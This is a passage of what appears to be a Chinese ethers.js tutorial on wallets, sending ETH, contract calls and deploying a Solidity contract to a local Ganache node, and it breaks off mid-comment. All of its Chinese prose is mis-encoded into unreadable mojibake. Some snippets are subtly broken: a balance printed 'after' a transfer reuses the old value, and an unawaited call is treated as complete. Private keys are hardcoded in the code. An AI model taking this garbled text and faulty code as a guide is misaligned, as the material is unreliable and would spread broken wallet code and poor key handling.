è¯»å–æ–‡ä»¶çš„abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// åˆçº¦åœ°å€let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// åˆ›å»ºåˆçº¦let contract = new ethers.Contract(con_Address,con_ABI,provider);let abi = [ &quot;function callme() public&quot;, &quot;function getValue() external view returns(int)&quot;,]let contract1 = new ethers.Contract(con_Address,abi,provider);async function demo1()&#123; // è°ƒç”¨åˆçº¦çš„åªè¯»å‡½æ•° let value = await contract1.getValue(); console.log(&quot;demo1&#x27;s value =&gt; &quot; + value);&#125;demo1() è¿è¡Œç»“æœï¼š 4.3 æ›´å¤šçš„è¯»å–åˆçº¦ä¿¡æ¯å¯åˆ° å®˜æ–¹æ–‡æ¡£ æŸ¥çœ‹5.å‘é€ETH5.1 Signerç­¾åç±»åœ¨ethersä¸­ï¼ŒSignerç­¾åè€…ç±»æ˜¯ä»¥å¤ªåŠè´¦æˆ·çš„æŠ½è±¡ç±»ï¼Œå¯ç”¨äºå¯¹æ¶ˆæ¯å’Œäº¤æ˜“è¿›è¡Œç­¾åï¼Œå¹¶å°†ç­¾åçš„äº¤æ˜“å‘é€åˆ°ä»¥å¤ªåŠç½‘ç»œï¼Œå¹¶æ›´æ”¹åŒºå—é“¾çŠ¶æ€ã€‚Signerç±»æ˜¯æŠ½è±¡ç±»ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å®ƒçš„å­ç±»ï¼šWalleté’±åŒ…ç±»ã€‚ 5.2 Walleté’±åŒ…ç±»Walletç±»ç»§æ‰¿äº†Signeç±»ï¼Œå¹¶ä¸”å¼€å‘è€…å¯ä»¥åƒåŒ…å«ç§é’¥çš„å¤–éƒ¨æ‹¥æœ‰è€…è´¦æˆ·ï¼ˆEOAï¼‰ä¸€æ ·ï¼Œç”¨å®ƒå¯¹äº¤æ˜“å’Œæ¶ˆæ¯è¿›è¡Œç­¾åã€‚ 5.2.1æ–¹æ³•ä¸€ï¼šåˆ›å»ºéšæœºçš„walletå¯¹è±¡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ethers.Wallet.createRandom()å‡½æ•°åˆ›å»ºå¸¦æœ‰éšæœºç§é’¥çš„Walletå¯¹è±¡ã€‚å¯¹è¯¥ç§é’¥ç”±åŠ å¯†å®‰å…¨çš„ç†µæºç”Ÿæˆï¼Œå¦‚æœå½“å‰ç¯å¢ƒæ²¡æœ‰å®‰å…¨çš„ç†µæºï¼Œåˆ™ä¼šå¼•å‘é”™è¯¯ã€‚ tipsï¼šåœ¨å¯†ç å­¦ä¸­ï¼Œç†µï¼ˆentropyï¼‰æ˜¯æŒ‡éšæœºæ€§çš„åº¦é‡ã€‚åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œç†µæºï¼ˆentropy sourceï¼‰æ˜¯æŒ‡ç”¨äºç”Ÿæˆéšæœºæ•°æˆ–éšæœºç§å­çš„æºå¤´ã€‚ åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œä¸ºäº†ç¡®ä¿éšæœºæ•°çš„å®‰å…¨æ€§å’Œä¸å¯é¢„æµ‹æ€§ï¼Œéœ€è¦ä½¿ç”¨ç†µæºæ¥ç”Ÿæˆéšæœºæ•°æˆ–éšæœºç§å­ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç†µæºå¯ä»¥æ˜¯å¤–éƒ¨çš„æ•°æ®æºï¼Œä¾‹å¦‚åŒºå—å“ˆå¸Œæˆ–è€…æ—¶é—´æˆ³ç­‰ï¼Œä¹Ÿå¯ä»¥æ˜¯åˆçº¦å†…éƒ¨çš„æ•°æ®æºï¼Œä¾‹å¦‚åˆçº¦çš„å­˜å‚¨æ§½æˆ–è€…åˆçº¦çš„æ‰§è¡Œç»“æœç­‰ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç†µæºçš„è´¨é‡å’Œå®‰å…¨æ€§å¯¹äºå¯†ç å­¦åº”ç”¨éå¸¸é‡è¦ã€‚å¦‚æœç†µæºä¸å¤Ÿéšæœºæˆ–è€…ä¸å¤Ÿå®‰å…¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´éšæœºæ•°çš„å¯é¢„æµ‹æ€§ï¼Œä»è€Œç ´åå¯†ç å­¦åº”ç”¨çš„å®‰å…¨æ€§ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨ç†µæºç”Ÿæˆéšæœºæ•°æˆ–éšæœºç§å­æ—¶ï¼Œéœ€è¦é€‰æ‹©åˆé€‚çš„ç†µæºï¼Œå¹¶å¯¹å…¶è¿›è¡Œå……åˆ†çš„æµ‹è¯•å’ŒéªŒè¯ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§å’Œä¸å¯é¢„æµ‹æ€§ã€‚ 12// åˆ›å»ºéšæœºçš„walletå¯¹è±¡const wallet1 = new ethers.Wallet.createRandom() 5.2.2æ–¹æ³•äºŒï¼šç”¨ç§é’¥åˆ›å»ºwalletå¯¹è±¡æˆ‘ä»¬å·²çŸ¥ç§é’¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ethers.Wallet() å‡½æ•°åˆ›å»º Walletå¯¹è±¡ã€‚ ä»Ganacheä¸­è·å–privateKey 123// åˆ©ç”¨ç§é’¥å’Œprovideråˆ›å»ºwalletå¯¹è±¡const privateKey = &#x27;&#x27; // å¡«å…¥ä½ çš„ç§é’¥const wallet2 = new ethers.Wallet(privateKey, provider) 5.2.3æ–¹æ³•ä¸‰ï¼šä»åŠ©è®°è¯åˆ›å»ºwalletå¯¹è±¡æˆ‘ä»¬å·²çŸ¥åŠ©è®°è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ ethers.Wallet.fromMnemonic() å‡½æ•°åˆ›å»ºWalletå¯¹è±¡ã€‚ 12// ä»åŠ©è®°è¯åˆ›å»ºwalletå¯¹è±¡const wallet3 = new ethers.Wallet.fromMnemonic(mnemonic.phrase) 5.2.4 å…¶ä»–æ–¹æ³•ï¼šé€šè¿‡JSONæ–‡ä»¶åˆ›å»ºwalletå¯¹è±¡é€šè¿‡ethers.Wallet.fromEncryptedJsonè§£å¯†ä¸€ä¸ªJSONé’±åŒ…æ–‡ä»¶åˆ›å»ºé’±åŒ…å®ä¾‹ï¼ŒJSONæ–‡ä»¶å³keystoreæ–‡ä»¶ï¼Œé€šå¸¸æ¥è‡ªGeth, Parityç­‰é’±åŒ… 5.3 å‘é€ETHæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Walletå®ä¾‹æ¥å‘é€ETHã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªäº¤æ˜“è¯·æ±‚ï¼Œåœ¨é‡Œé¢å£°æ˜æ¥æ”¶åœ°å€toå’Œå‘é€çš„ETHæ•°é¢valueã€‚äº¤æ˜“è¯·æ±‚TransactionRequestç±»å‹å¯ä»¥åŒ…å«å‘é€æ–¹ fromï¼Œnonceå€¼ nounceï¼Œè¯·æ±‚æ•°æ®dataç­‰ä¿¡æ¯ã€‚ 12345// åˆ›å»ºäº¤æ˜“è¯·æ±‚ï¼Œå‚æ•°ï¼štoä¸ºæ¥æ”¶åœ°å€ï¼Œvalueä¸ºETHæ•°é¢const tx = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125; ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨Walletç±»çš„sendTransactionæ¥å‘é€äº¤æ˜“ï¼Œç­‰å¾…äº¤æ˜“ä¸Šé“¾ï¼Œå¹¶è·å¾—äº¤æ˜“çš„æ•°æ®ã€‚ 1234//å‘é€äº¤æ˜“ï¼Œè·å¾—æ”¶æ®const receipt = await wallet2.sendTransaction(tx)await receipt.wait() // ç­‰å¾…é“¾ä¸Šç¡®è®¤äº¤æ˜“console.log(receipt) // æ‰“å°äº¤æ˜“è¯¦æƒ… 5.4 ä»£ç å®ä¾‹5.4.1åˆ›å»ºWalletå®ä¾‹ä¸‰ç§æ–¹æ³•çš„ç¤ºä¾‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import &#123; ethers &#125; from &quot;ethers&quot;;const netWork = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.providers.JsonRpcProvider(netWork);// let balance = await provider.getBalance(&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;);// console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);/** æ–¹æ³•ä¸€ï¼šåˆ›å»ºéšæœºç§é’¥çš„Walletå¯¹è±¡ã€‚ è¿™ç§æ–¹æ³•åˆ›å»ºçš„é’±åŒ…æ˜¯å•æœºçš„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨connect(provider)å‡½æ•°ï¼Œè¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹ã€‚è¿™ç§æ–¹æ³•åˆ›å»ºçš„é’±åŒ…å¯ä»¥ç”¨mnemonicè·å–åŠ©è®°è¯ */const wallet1 = ethers.Wallet.createRandom();console.log(&quot;wallet1 =&gt;\\n&quot;,wallet1);const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;console.log(&quot;åŠ©è®°è¯ï¼š\\n&quot; , mnemonic);/** * æ–¹æ³•äºŒï¼šåˆ©ç”¨ç§é’¥å’Œproviderå®ä¾‹åˆ›å»ºWalletå¯¹è±¡ * è¿™ç§æ–¹æ³•ä¸èƒ½è·å–åŠ©è®°è¯ */const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);console.log(&quot;wallet2 =&gt;\\n&quot;,wallet2);/** * æ–¹æ³•ä¸‰ï¼šåˆ©ç”¨åŠ©è®°è¯åˆ›å»ºWalletå¯¹è±¡ */// ä»åŠ©è®°è¯åˆ›å»ºwalletå¯¹è±¡const wallet3 = ethers.Wallet.fromMnemonic(mnemonic.phrase);console.log(&quot;wallet3 =&gt; &quot;,wallet3); è¿è¡Œç»“æœï¼š 5.4.2 è·å–é’±åŒ…åœ°å€ ä»£ç ï¼š 123456789101112/** * è·å–é’±åŒ…åœ°å€ */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() const address3 = await wallet3.getAddress() // è·å–åœ°å€console.log(`1. è·å–é’±åŒ…åœ°å€`);console.log(`é’±åŒ…1åœ°å€: $&#123;address1&#125;`);console.log(`é’±åŒ…2åœ°å€: $&#123;address2&#125;`);console.log(`é’±åŒ…3åœ°å€: $&#123;address3&#125;`);console.log(`é’±åŒ…1å’Œé’±åŒ…3çš„åœ°å€æ˜¯å¦ç›¸åŒ: $&#123;address1 === address3&#125;`); è¿è¡Œç»“æœï¼š 5.4.3 è·å–åŠ©è®°è¯åˆ©ç”¨é’±åŒ…å¯¹è±¡çš„mnemonicæˆå‘˜è·å–åŠ©è®°è¯ï¼š 1console.log(`é’±åŒ…1åŠ©è®°è¯: $&#123;wallet1.mnemonic.phrase&#125;`) ç»“æœï¼š 5.4.4 åˆ©ç”¨é’±åŒ…å¯¹è±¡çš„ privateKey æˆå‘˜è·å–ç§é’¥ï¼š1console.log(`é’±åŒ…2ç§é’¥: $&#123;wallet2.privateKey&#125;`) è¿è¡Œç»“æœï¼š åˆ°ganacheä¸ŠæŸ¥çœ‹ï¼š ç»“æœæ˜¯ç›¸åŒçš„ã€‚ 5.4.5 è·å–é’±åŒ…åœ¨é“¾ä¸Šçš„äº¤äº’æ¬¡æ•°åˆ©ç”¨ getTransactionCount()å‡½æ•°è·å–é’±åŒ…åœ¨é“¾ä¸Šçš„äº¤äº’æ¬¡æ•° 1234const txCount1 = await wallet1WithProvider.getTransactionCount()const txCount2 = await wallet2.getTransactionCount()console.log(`é’±åŒ…1å‘é€äº¤æ˜“æ¬¡æ•°: $&#123;txCount1&#125;`)console.log(`é’±åŒ…2å‘é€äº¤æ˜“æ¬¡æ•°: $&#123;txCount2&#125;`) è¿è¡Œç»“æœï¼š åˆ°ganacheä¸ŠæŸ¥çœ‹ï¼š 5.4.6 å‘é€ETHæˆ‘ä»¬ç”¨wallet2ç»™wallet1å‘é€0.001 ETHï¼Œå¹¶æ‰“å°äº¤æ˜“å‰åçš„é’±åŒ…ä½™é¢ã€‚ç”±äºwallet1æ˜¯æ–°å»ºçš„éšæœºç§é’¥é’±åŒ…ï¼Œå› æ­¤äº¤æ˜“å‰ä½™é¢ä¸º0ï¼Œè€Œäº¤æ˜“åä½™é¢ä¸º0.001 ETHã€‚ 1234567891011121314151617181920212223242526272829303132333435363738const wallet1 = ethers.Wallet.createRandom();const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);/** * è·å–é’±åŒ…åœ°å€ */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() /** * å‘é€ETH */console.log(&quot; wallet2 ç»™ wallet1 è½¬è´¦0.01ETH&quot;);//äº¤æ˜“å‰ä½™é¢console.log(`é’±åŒ…1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`é’±åŒ…2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`);// æ„å»ºäº¤æ˜“è¯·æ±‚ï¼›toä¸ºæ¥æ”¶åœ°å€ï¼Œvalueä¸ºETHæ•°é¢const TX = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125;// å‘é€äº¤æ˜“ï¼Œè·å¾—æ”¶æ®const recepit = await wallet2.sendTransaction(TX);await recepit.wait();console.log(&quot;receipt =&gt; &quot;,recepit);console.log(&quot;å‘é€åçš„è´¦æˆ·ä½™é¢&quot;);console.log(`é’±åŒ…1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`é’±åŒ…2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`); è¿è¡Œç»“æœï¼š ethers.js_day036. åˆçº¦äº¤äº’6.1 åˆ›å»ºå¯å†™Contractå˜é‡ å£°æ˜å¯å†™çš„Contractå˜é‡çš„è§„åˆ™ï¼š 1const contract = new ethers.Contract(address, abi, signer) è§£è¯»ï¼šå…¶ä¸­ address æ˜¯åˆçº¦åœ°å€ï¼Œabiæ˜¯åˆçº¦çš„abiæ¥å£ï¼Œsingeræ˜¯walletå¯¹è±¡ã€‚å£°æ˜å¯å†™contractéœ€è¦æä¾›signerï¼Œå£°æ˜å¯è¯»contractåªéœ€è¦provider å°†å¯è¯»åˆçº¦è½¬æ¢ä¸ºå¯å†™åˆçº¦ï¼š 1const contract2 = contract.connect(signer) 6.2 åˆçº¦äº¤äº’ è¯»åˆçº¦ä¿¡æ¯ä¸éœ€è¦gasã€‚å†™å…¥åˆçº¦éœ€è¦æ¥å…¥åˆçº¦ä¿¡æ¯ï¼Œæ„å»ºäº¤æ˜“ï¼Œå¹¶æ”¯ä»˜gasã€‚è¯¥äº¤æ˜“å°†ç”±æ•´ä¸ªç½‘ç»œçš„æ¯ä¸ªèŠ‚ç‚¹ä»¥åŠçŸ¿å·¥éªŒè¯ï¼Œå¹¶æ”¹å˜åŒºå—é“¾çŠ¶æ€ã€‚ åˆçº¦äº¤äº’çš„æ–¹æ³•å¦‚ä¸‹ï¼š 1234// å‘é€äº¤æ˜“const tx = await contract.METHOD_NAME(args [, overrides])// ç­‰å¾…é“¾ä¸Šç¡®è®¤äº¤æ˜“await tx.wait() è§£è¯»ä»£ç ï¼šå…¶ä¸­METHOD_NAMEä¸ºè°ƒç”¨çš„å‡½æ•°åï¼Œargsä¸ºå‡½æ•°å‚æ•°ï¼Œ[, overrides]æ˜¯å¯ä»¥é€‰æ‹©ä¼ å…¥çš„æ•°æ®ï¼ŒåŒ…æ‹¬ï¼š gasPriceï¼šgasä»·æ ¼ gasLimitï¼šgasä¸Šé™ valueï¼šè°ƒç”¨æ—¶ä¼ å…¥çš„etherï¼ˆå•ä½æ˜¯weiï¼‰ nonceï¼šnonceï¼ˆéšæœºæ•°ï¼Ÿï¼‰ æ³¨ï¼šæ­¤æ–¹æ³•ä¸èƒ½è·å–åˆçº¦è¿è¡Œçš„è¿”å›å€¼ï¼Œå¦‚è‹¥éœ€è¦è·å–åˆçº¦è¿è¡Œä½ çš„è¿”å›å€¼ï¼Œè¦ä½¿ç”¨Solidityäº‹ä»¶è®°å½•ï¼Œç„¶ååˆ©ç”¨äº¤æ˜“æ”¶æ®å»æŸ¥è¯¢ã€‚ 6.3 ä¾‹å­ï¼šä¸æœ¬åœ°ganacheåˆçº¦äº¤äº’ åˆ›å»ºproviderï¼Œwalletå˜é‡ 123456789&gt;import &#123; ethers &#125; from &quot;ethers&quot;;&gt;// è·å–æœ¬åœ°çš„provider&gt;const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);&gt;// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡&gt;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;&gt;const wallet = new ethers.Wallet(privateKey, provider); åˆ›å»ºå¯å†™åˆçº¦å˜é‡ï¼Œåœ¨æˆ‘è‡ªå·± domo1.solä¸­è°ƒç”¨4ä¸ªå‡½æ•° getSlot0():æŸ¥æ‰¾æ’æ§½0ä½ç½®çš„å€¼ï¼› getSlot1():æŸ¥æ‰¾æ’æ§½1ä½ç½®çš„å€¼ï¼› getSlot2():æŸ¥æ‰¾æ’æ§½2ä½ç½®çš„å€¼ï¼› depoist():è½¬è´¦ï¼› balanceOf():æŸ¥è¯¢åœ°å€ä½™é¢ã€‚ tipsï¼šè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯æ–¹æ³•æ˜¯ä¼ å…¥remixä¸Šè·å–çš„abi 12345678910111213/** * åˆ›å»ºå¯å†™çš„åˆçº¦å˜é‡ */ // è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// åœ¨remixä¸Šéƒ¨ç½²çš„åˆçº¦åœ°å€const contractAddress = &quot;0x5B1557A5AD3cfAC88F3624743BF67baB28723899&quot;;// å£°æ˜å¯å†™åˆçº¦const constract = new ethers.Contract(contractAddress,ABI,wallet); 3.è°ƒç”¨getSlot0ã€1ã€2()ä¸‰ä¸ªå‡½æ•°ï¼ŒæŸ¥çœ‹å…¶å€¼ 12345678910// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`) è¿è¡Œç»“æœï¼š 4.æŸ¥è¯¢è´¦æˆ·çš„ä½™é¢ 123456// éœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`) è¿è¡Œç»“æœï¼š 5.è½¬è´¦æ“ä½œï¼Œæ‰“å°äº¤æ˜“è¯¦æƒ…å’Œä½™é¢ã€‚ 123456//è½¬è´¦let balance1 = await provider.getBalance(test_address);console.log(`è½¬è´¦å‰çš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`è½¬è´¦åçš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) è¿è¡Œç»“æœï¼š ç”±äºvscodeæ˜¾ç¤ºæ•°ä½çš„é—®é¢˜ï¼Œä½¿ç”¨åœ¨remixä¸ŠæŸ¥è¯¢æ˜¾ç¤ºçš„ä½æ•°æ›´å¤š æ³¨ï¼šå¯¹äºépure&#x2F;viewå‡½æ•°çš„è°ƒç”¨ï¼Œä¼šè¿”å›äº¤æ˜“çš„ä¿¡æ¯ã€‚å¦‚æœæƒ³çŸ¥é“å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­åˆçº¦å˜é‡çš„å˜åŒ–ï¼Œå¯ä»¥åœ¨åˆçº¦ä¸­ä½¿ç”¨emitè¾“å‡ºäº‹ä»¶ï¼Œå¹¶åœ¨è¿”å›çš„transactionä¿¡æ¯ä¸­è¯»å–äº‹ä»¶ä¿¡æ¯æ¥è·å–å¯¹åº”çš„å€¼ å®Œæ•´çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);/** * åˆ›å»ºå¯å†™çš„åˆçº¦å˜é‡ */ // è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// åœ¨remixä¸Šéƒ¨ç½²çš„åˆçº¦åœ°å€const contractAddress = &quot;0xf8fe22cA93bD2416a106dFB62168C0D7eBF557FE&quot;;// å£°æ˜å¯å†™åˆçº¦const constract = new ethers.Contract(contractAddress,ABI,wallet);/** * è°ƒç”¨åˆçº¦çš„å‡½æ•° */// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);// éœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`)//è½¬è´¦let balance1 = await provider.getBalance(test_address);console.log(`è½¬è´¦å‰çš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`è½¬è´¦åçš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 7.éƒ¨ç½²åˆçº¦7.1 åˆçº¦å·¥å‚ ethers.js åˆ›é€ äº†åˆçº¦å·¥å‚ ContractFactoryç±»å‹ï¼Œæ–¹ä¾¿å¼€å‘è€…éƒ¨ç½²åˆçº¦ã€‚ä½ å¯ä»¥åˆ©ç”¨åˆçº¦abiï¼Œç¼–è¯‘å¾—åˆ°çš„å­—èŠ‚ç bytecodeå’Œç­¾åè€…å˜é‡ singer æ¥åˆ›å»ºåˆçº¦å·¥å‚å®ä¾‹ï¼Œä¸ºéƒ¨ç½²åˆçº¦åšå‡†å¤‡ã€‚ 1const contractFactory = new ethers.ContractFactory(abi, bytecode, signer); æ³¨ï¼šå¦‚æœåˆçº¦çš„æ„é€ å‡½æ•°æœ‰å‚æ•°ï¼Œé‚£ä¹ˆåœ¨abiä¸­å¿…é¡»åŒ…å«æ„é€ å‡½æ•°ã€‚ åœ¨åˆ›å»ºå¥½åˆçº¦å·¥å‚ä¹‹åï¼Œå¯ä»¥è°ƒç”¨å®ƒçš„deployå‡½æ•°ï¼Œå¹¶ä¼ å…¥åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°argsæ¥éƒ¨ç½²å¹¶å¾—åˆ°åˆçº¦å®ä¾‹ï¼š 1const contract = await contractFactory.deploy(args) å¯ä»¥ä½¿ç”¨ä¸¤ç§å‘½ä»¤ï¼Œç­‰å¾…åˆçº¦éƒ¨ç½²åœ¨é“¾ä¸Šç¡®è®¤ï¼Œç„¶åå†è¿›è¡Œäº¤äº’ 12await contractERC20.deployed()//æˆ–è€… await contract.deployTransaction.wait() 7.2 ä¾‹å­ï¼šéƒ¨ç½²æˆ‘è‡ªå·±ç¼–å†™çš„demo1.solåˆçº¦ demo2.sol ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract demo2 &#123; uint slot0; address slot1; string public slot2; // åˆå§‹åŒ–ä¸€äº›å˜é‡ constructor(uint _slot0, address _slot1, string memory _slot2) payable&#123; slot0 = _slot0; slot1 = _slot1; slot2 = _slot2; &#125; function setSlot0(uint num) public &#123; slot0 = num; &#125; function getSlot0() external view returns(uint)&#123; return slot0; &#125; function setSlot1(address _address) public &#123; slot1 = _address; &#125; function getSlot1() external view returns(address)&#123; return slot1; &#125; function setSlot2(string memory _str) public &#123; slot2 = _str; &#125; function getSlot2() external view returns(string memory)&#123; return slot2; &#125; function depoist(uint _amount, address payable _to) external &#123; uint balance = address(this).balance; require(balance &gt; _amount, &quot;You balance is less than your address(this).balance&quot;); _to.transfer(_amount); &#125; function balanceOf(address _address) external view returns(uint) &#123; return address(_address).balance; &#125;&#125; åˆ›å»ºproviderå’Œwalletå˜é‡ 123456789import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider); å‡†å¤‡demo1åˆçº¦çš„å­—èŠ‚ç å’ŒABI(è¿™é‡Œæˆ‘ä½¿ç”¨remixç”Ÿæˆçš„ABI)ã€‚å› ä¸ºdemo2çš„æ„é€ å‡½æ•°å«æœ‰å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠå®ƒåŒ…å«å†ABIä¸­ã€‚åˆçº¦çš„å­—èŠ‚ç å¯ä»¥ä»remixçš„ç¼–è¯‘é¢æ¿ä¸­ç‚¹å‡»bytecodeæŒ‰é’®æ‹·è´ä¸‹æ¥(ä¸ºäº†ä»£ç çš„å¯è¯»æ€§ï¼Œå°†æ‹·è´çš„å­—èŠ‚ç æ–°å»ºä¸€ä¸ª .codeæ–‡ä»¶å­˜æ”¾ï¼Œè·å–çš„æ—¶å€™ ä½¿ç”¨ fsæ¥è¯»å–)ï¼Œå…¶ä¸­â€objectâ€å­—æ®µå¯¹åº”çš„æ•°æ®å°±æ˜¯å­—èŠ‚ç ã€‚å¦‚æœéƒ¨ç½²åœ¨é“¾ä¸Šçš„åˆçº¦ï¼Œä½ å¯ä»¥åœ¨etherscançš„Contracté¡µé¢çš„Contract Creation Codeä¸­æ‰¾åˆ°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839 // demo2äººç±»å¯è¯»abi /** const demo2ABI = [ &quot;constructor(uint _slot0, address _slot1, string memory _slot2) payable&quot;, ....... ] */ // è¯»å–æ–‡ä»¶çš„abi const ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString()); // è¯»å–æ–‡ä»¶çš„bytecode const byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString(); 3. åˆ›å»ºåˆçº¦å·¥å‚ContractFactoryå®ä¾‹ ```js // åˆ›å»ºåˆçº¦å·¥å‚ ContractFactory å®ä¾‹ const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet); 4. è°ƒç”¨å·¥å‚åˆçº¦çš„deploy() å‡½æ•°å¹¶å¡«å…¥æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œéƒ¨ç½²demo2åˆçº¦å¹¶è·å–åˆçº¦å®ä¾‹ã€‚æœ‰å†™å¸¸ç”¨æ–¹æ³•ï¼š - `contract.address`è·å–åˆçº¦åœ°å€ï¼Œ - `contract.deployTransaction`è·å–éƒ¨ç½²è¯¦æƒ…ï¼Œ - `contractERC20.deployed()`ç­‰å¾…åˆçº¦éƒ¨ç½²åœ¨é“¾ä¸Šç¡®è®¤ã€‚ ```js // åˆ©ç”¨ factoryDemo2 éƒ¨ç½²demo2 åˆçº¦ const gasPrice = await provider.getGasPrice(); const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;; const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction); console.log(`éƒ¨ç½²å¾—åˆ°çš„åˆçº¦åœ°å€ï¼š$&#123;constract.address&#125;`); console.log(&quot;éƒ¨ç½²åˆçº¦çš„äº¤æ˜“è¯¦æƒ…&quot;); console.log(constract.deployTransaction); è°ƒç”¨åˆçº¦å‡½æ•° 12345678910111213/** * 